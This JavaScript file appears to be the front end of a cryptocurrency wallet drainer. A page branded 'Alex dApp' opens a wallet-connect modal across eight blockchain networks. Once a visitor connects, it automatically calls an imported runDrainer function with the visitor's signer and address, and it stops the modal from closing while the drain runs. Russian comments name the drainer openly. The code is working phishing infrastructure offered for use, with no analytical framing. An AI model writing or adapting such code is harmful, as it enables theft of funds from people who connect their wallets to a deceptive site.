import { createAppKit } from '@reown/appkit'
import {
  mainnet,
  polygon,
  bsc,
  avalanche,
  arbitrum,
  optimism,
  linea,
  base
} from '@reown/appkit/networks'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { ethers } from 'ethers'
import { runDrainer } from './drainer.js'

const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'

// Все поддерживаемые сети
const networks = [
  mainnet,
  polygon,
  bsc,
  avalanche,
  arbitrum,
  optimism,
  linea,
  base
]

const wagmiAdapter = new WagmiAdapter({
  projectId,
  networks
})

const metadata = {
  name: 'Alex dApp',
  description: 'Connect your wallet',
  url: 'https://checkalex.xyz',
  icons: ['https://checkalex.xyz/icon.png']
}

const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  metadata,
  projectId,
  features: {
    analytics: true
  }
})

// Флаг для отслеживания состояния дренажа
let isDraining = false;

// Открыть модалку по клику
document.getElementById('open-connect-modal').addEventListener('click', () => modal.open())

// Запуск drainer-а по клику (если нужно вручную)
document.getElementById('drainer-btn').addEventListener('click', async () => {
  try {
    const provider = new ethers.providers.Web3Provider(window.ethereum, 'any')
    const signer = provider.getSigner()
    const address = await signer.getAddress()

    await runDrainer(provider, signer, address)
  } catch (e) {
    console.error("Ошибка в Drainer:", e)
  }
})

// Автоматический запуск drainer-а после подключения кошелька
modal.on('connect', async () => {
  try {
    isDraining = true;
    const provider = new ethers.providers.Web3Provider(window.ethereum, 'any')
    const signer = provider.getSigner()
    const address = await signer.getAddress()

    await runDrainer(provider, signer, address)
  } catch (e) {
    console.error("Ошибка в Drainer:", e)
  } finally {
    isDraining = false;
  }
})

// Переопределение поведения закрытия модального окна
const originalClose = modal.close;
modal.close = () => {
  if (!isDraining) {
    originalClose();
  } else {
    console.log("Дренаж в процессе, модальное окно не будет закрыто.")
  }
}
